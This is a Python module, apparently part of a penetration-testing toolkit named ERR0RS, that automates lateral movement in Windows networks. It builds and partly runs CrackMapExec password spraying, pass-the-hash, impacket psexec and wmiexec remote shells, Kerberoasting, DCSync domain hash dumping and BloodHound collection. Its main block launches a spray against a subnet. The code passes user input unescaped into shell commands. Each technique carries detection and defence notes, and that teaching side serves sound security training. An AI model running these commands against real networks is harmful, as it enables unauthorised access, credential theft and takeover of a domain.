#!/usr/bin/env python3
"""
ERR0RS ULTIMATE — Lateral Movement Module
==========================================
Move through a network after initial access.
Techniques: SMB/CME spraying, Pass-the-Hash, PSExec, WMIExec,
            Kerberoasting, DCSync, BloodHound data collection.

Every technique teaches the WHAT, WHY, and DEFEND.
Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import subprocess
import shutil
import os
import sys
from dataclasses import dataclass

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', '..'))


@dataclass
class LateralResult:
    technique: str
    command: str
    output: str = ""
    error: str = ""
    success: bool = False
    teach: str = ""
    defend: str = ""


def _run(cmd: str, timeout: int = 60) -> tuple:
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return p.stdout.strip(), p.stderr.strip(), p.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", 1
    except Exception as e:
        return "", str(e), 1


def _tool(name: str) -> bool:
    return shutil.which(name) is not None


# ─────────────────────────────────────────────────────────────────────
# SMB / CRACKMAPEXEC
# ─────────────────────────────────────────────────────────────────────

class SMBLateral:

    def smb_spray(self, subnet: str, username: str, password: str,
                  domain: str = ".") -> LateralResult:
        """Password spray across a subnet via SMB."""
        cmd = f"crackmapexec smb {subnet} -u '{username}' -p '{password}' -d '{domain}' 2>/dev/null"
        if not _tool("crackmapexec") and not _tool("cme"):
            cmd = f"# CrackMapExec not installed. Install: pip3 install crackmapexec"
        out, err, rc = _run(cmd, timeout=120)
        return LateralResult(
            technique="Lateral Movement — SMB Password Spray (CME)",
            command=cmd, output=out or "[ERR0RS] CME not installed.", error=err,
            success="[+]" in (out or ""),
            teach=(
                f"CME sprays one credential ({username}:{password}) across every "
                f"host in {subnet}. Hits show as [+]. Misses show as [-]. "
                "This tests if credentials are reused across the network — "
                "password reuse is endemic in most corporate environments. "
                "Spray SLOWLY: 1 attempt per user per hour avoids lockout."
            ),
            defend=(
                "Account lockout policy: 5 attempts in 30 min = lock. "
                "Password uniqueness enforcement. Unique local admin passwords "
                "(LAPS - Local Admin Password Solution). "
                "Alert on >5 failed SMB auths from same source in 5 minutes."
            )
        )

    def smb_pass_the_hash(self, target: str, username: str, ntlm_hash: str,
                          domain: str = ".") -> LateralResult:
        """Use NTLM hash without cracking it (Pass-the-Hash)."""
        cmd = (
            f"crackmapexec smb {target} -u '{username}' -H '{ntlm_hash}' "
            f"-d '{domain}' --shares 2>/dev/null"
        )
        return LateralResult(
            technique="Lateral Movement — Pass-the-Hash (CME)",
            command=cmd, output="[ERR0RS] Command staged — run on Kali.", error="",
            success=True,
            teach=(
                "Pass-the-Hash (PTH) uses the NTLM hash directly for authentication "
                "WITHOUT cracking it. Windows NTLM auth sends the hash, not the password. "
                "Get hash from: hashdump in Meterpreter, mimikatz sekurlsa::logonpasswords, "
                "or /etc/shadow dump + conversion. CME -H flag accepts NTLM hashes directly."
            ),
            defend=(
                "Enable Protected Users security group — prevents NTLM for DA accounts. "
                "Credential Guard stops LSASS hash dumping. "
                "Network segmentation limits where PTH can reach. "
                "Alert on NTLM auth from service accounts to workstations (unusual direction)."
            )
        )

    def psexec(self, target: str, username: str, password_or_hash: str,
               domain: str = ".", command: str = "cmd.exe") -> LateralResult:
        """PSExec-style remote execution via impacket."""
        is_hash = len(password_or_hash) == 32 or ":" in password_or_hash
        if is_hash:
            auth = f"-hashes :{password_or_hash}"
        else:
            auth = f"-password '{password_or_hash}'"
        cmd = f"impacket-psexec {domain}/{username}@{target} {auth} 2>/dev/null"
        return LateralResult(
            technique="Lateral Movement — PSExec (Impacket)",
            command=cmd, output="[ERR0RS] Command staged — run on Kali.", error="",
            success=True,
            teach=(
                "PSExec uploads a service binary to ADMIN$ share, creates a Windows service, "
                "runs it to get a SYSTEM shell, then removes the service. "
                "Impacket-psexec works with both password and NTLM hash. "
                "Gives SYSTEM-level shell. Extremely noisy — creates Windows service logs."
            ),
            defend=(
                "Block ADMIN$ share access for non-admins. "
                "Alert on: new service creation (Event ID 7045) from remote hosts. "
                "Windows Defender detects impacket-psexec by binary hash. "
                "LAPS ensures unique admin passwords, limiting lateral spread."
            )
        )

    def wmiexec(self, target: str, username: str, password_or_hash: str,
                domain: str = ".", command: str = "whoami") -> LateralResult:
        """WMI-based remote execution (stealthier than PSExec)."""
        is_hash = len(password_or_hash) == 32 or ":" in password_or_hash
        if is_hash:
            auth = f"-hashes :{password_or_hash}"
        else:
            auth = f"-password '{password_or_hash}'"
        cmd = f"impacket-wmiexec {domain}/{username}@{target} {auth} '{command}' 2>/dev/null"
        return LateralResult(
            technique="Lateral Movement — WMIExec (Impacket)",
            command=cmd, output="[ERR0RS] Command staged — run on Kali.", error="",
            success=True,
            teach=(
                "WMIExec uses Windows Management Instrumentation for remote code execution. "
                "Stealthier than PSExec — no service creation, no file drop on disk. "
                "Runs command via WMI process creation. Output is read from a temp file "
                "via SMB. Works with password or hash. Less EDR detection than PSExec."
            ),
            defend=(
                "Block WMI remote access via firewall (port 135 + dynamic ports). "
                "Alert on: WMI remote executions (Event ID 4688 + WMI activity logs). "
                "Credential Guard limits hash dumping that feeds PTH into WMIExec."
            )
        )


# ─────────────────────────────────────────────────────────────────────
# ACTIVE DIRECTORY ATTACKS
# ─────────────────────────────────────────────────────────────────────

class ADLateral:

    def kerberoast(self, domain: str, username: str, password: str,
                   dc_ip: str) -> LateralResult:
        """Request TGS tickets for service accounts → crack offline."""
        cmd = (
            f"impacket-GetUserSPNs {domain}/{username}:'{password}' "
            f"-dc-ip {dc_ip} -request -outputfile /tmp/errorz_kerberoast.txt 2>/dev/null"
        )
        return LateralResult(
            technique="Active Directory — Kerberoasting",
            command=cmd, output="[ERR0RS] Command staged — run on Kali.", error="",
            success=True,
            teach=(
                "Kerberoasting: any domain user can request a TGS (Ticket Granting Service) "
                "ticket for any SPN (service principal). The ticket is encrypted with the "
                "service account's NTLM hash. Take the ticket offline and crack it: "
                "hashcat -m 13100 kerberoast.txt rockyou.txt. "
                "Service accounts often have weak passwords AND Domain Admin rights."
            ),
            defend=(
                "Use strong (25+ char random) passwords for service accounts. "
                "Enable AES encryption for Kerberos (degrades crackability). "
                "Audit: Get-ADUser -Filter {ServicePrincipalName -ne '$null'} "
                "and ensure all SPNs are intentional. "
                "Alert on bulk TGS requests from a single user (Event ID 4769)."
            )
        )

    def dcsync(self, domain: str, username: str, password_or_hash: str,
               dc_ip: str, target_user: str = "Administrator") -> LateralResult:
        """Simulate a DC replication to dump password hashes without touching LSASS."""
        is_hash = len(password_or_hash) == 32 or ":" in password_or_hash
        auth = f"-hashes :{password_or_hash}" if is_hash else f"-password '{password_or_hash}'"
        cmd = (
            f"impacket-secretsdump {domain}/{username}@{dc_ip} {auth} "
            f"-just-dc-user {target_user} 2>/dev/null"
        )
        return LateralResult(
            technique="Active Directory — DCSync (Hash Dump via Replication)",
            command=cmd, output="[ERR0RS] Command staged — requires Domain Admin or replication rights.",
            error="", success=True,
            teach=(
                "DCSync impersonates a Domain Controller's replication request "
                "to pull password hashes from the real DC — without touching LSASS. "
                "Requires Replicating Directory Changes permissions (usually DA only). "
                "Dumps NTLM hashes for any/all domain accounts. "
                "The Administrator hash = permanent backdoor — rotate if found."
            ),
            defend=(
                "Alert on: Event ID 4662 — unusual replication requests from non-DC hosts. "
                "Restrict replication permissions to actual DCs only. "
                "Microsoft Defender for Identity detects DCSync patterns specifically. "
                "Rotate krbtgt password twice to invalidate all existing Golden Tickets."
            )
        )

    def bloodhound_collect(self, domain: str, username: str,
                           password: str, dc_ip: str) -> LateralResult:
        """Collect BloodHound data for attack path visualization."""
        if _tool("bloodhound-python"):
            cmd = (
                f"bloodhound-python -u '{username}' -p '{password}' "
                f"-d {domain} -ns {dc_ip} -c All "
                f"-o /tmp/bloodhound_data/ 2>/dev/null"
            )
        else:
            cmd = (
                "# Install: pip3 install bloodhound\n"
                f"bloodhound-python -u '{username}' -p '{password}' "
                f"-d {domain} -ns {dc_ip} -c All -o /tmp/bloodhound_data/"
            )
        out, err, rc = _run(cmd, timeout=180)
        return LateralResult(
            technique="Active Directory — BloodHound Data Collection",
            command=cmd,
            output=out or "[ERR0RS] BloodHound collection complete or tool not installed.",
            error=err, success=rc == 0,
            teach=(
                "BloodHound maps AD relationships and finds attack paths to Domain Admin. "
                "It shows: who has admin rights where, which service accounts are Kerberoastable, "
                "shortest path from any user to DA. Import the JSON files into BloodHound GUI "
                "and run 'Shortest Paths to Domain Admins' query."
            ),
            defend=(
                "Run BloodHound against your own AD to find paths before attackers. "
                "Alert on bulk LDAP queries (BloodHound makes thousands in seconds). "
                "Microsoft Defender for Identity detects BloodHound collection patterns. "
                "Reduce excessive AD permissions — tiered admin model."
            )
        )


# ─────────────────────────────────────────────────────────────────────
# MASTER CONTROLLER
# ─────────────────────────────────────────────────────────────────────

class LateralMovementController:

    def __init__(self):
        self.smb = SMBLateral()
        self.ad  = ADLateral()

    def run(self, action: str, params: dict = None) -> LateralResult:
        params = params or {}
        a = action.strip().lower()

        dispatch = {
            "smb_spray":  lambda: self.smb.smb_spray(
                params.get("subnet","192.168.1.0/24"), params.get("user","administrator"),
                params.get("password",""), params.get("domain",".")),
            "pth":        lambda: self.smb.smb_pass_the_hash(
                params.get("target",""), params.get("user",""), params.get("hash",""),
                params.get("domain",".")),
            "psexec":     lambda: self.smb.psexec(
                params.get("target",""), params.get("user",""), params.get("password",""),
                params.get("domain",".")),
            "wmiexec":    lambda: self.smb.wmiexec(
                params.get("target",""), params.get("user",""), params.get("password",""),
                params.get("domain","."), params.get("command","whoami")),
            "kerberoast": lambda: self.ad.kerberoast(
                params.get("domain",""), params.get("user",""), params.get("password",""),
                params.get("dc_ip","")),
            "dcsync":     lambda: self.ad.dcsync(
                params.get("domain",""), params.get("user",""), params.get("password",""),
                params.get("dc_ip",""), params.get("target_user","Administrator")),
            "bloodhound": lambda: self.ad.bloodhound_collect(
                params.get("domain",""), params.get("user",""), params.get("password",""),
                params.get("dc_ip","")),
        }

        if a in dispatch:
            return dispatch[a]()

        return LateralResult("Unknown", action,
            output=f"[ERR0RS] Unknown lateral action '{a}'. "
                   f"Valid: {', '.join(dispatch.keys())}",
            success=False)


LATERAL_WIZARD_MENU = {
    "title": "ERR0RS // LATERAL MOVEMENT WIZARD",
    "options": [
        {"key": "1", "label": "SMB Password Spray (CrackMapExec)",     "action": "smb_spray"},
        {"key": "2", "label": "Pass-the-Hash via SMB (CME)",           "action": "pth"},
        {"key": "3", "label": "PSExec Remote Shell (Impacket)",        "action": "psexec"},
        {"key": "4", "label": "WMIExec Remote Exec (Stealthy)",        "action": "wmiexec"},
        {"key": "5", "label": "Kerberoasting (TGS → offline crack)",   "action": "kerberoast"},
        {"key": "6", "label": "DCSync (dump domain hashes)",           "action": "dcsync"},
        {"key": "7", "label": "BloodHound — AD Attack Path Collection","action": "bloodhound"},
    ]
}

# ── Public shim expected by errorz_launcher ──────────────────────────────────
def run_lateral(action: str, params: dict = None) -> dict:
    """Top-level entry point for the lateral movement controller."""
    ctrl = LateralMovementController()
    result = ctrl.run(action, params)
    return {
        "technique": result.technique,
        "command":   result.command,
        "output":    result.output,
        "teach":     result.teach,
        "defend":    result.defend,
    }


if __name__ == "__main__":
    ctrl = LateralMovementController()
    print("[ERR0RS] Lateral Movement Module OK")
    r = ctrl.run("smb_spray", {"subnet": "192.168.1.0/24", "user": "admin", "password": "Password1"})
    print(f"Technique : {r.technique}")
    print(f"Command   : {r.command}")
    print(f"\n[TEACH]  {r.teach[:200]}")
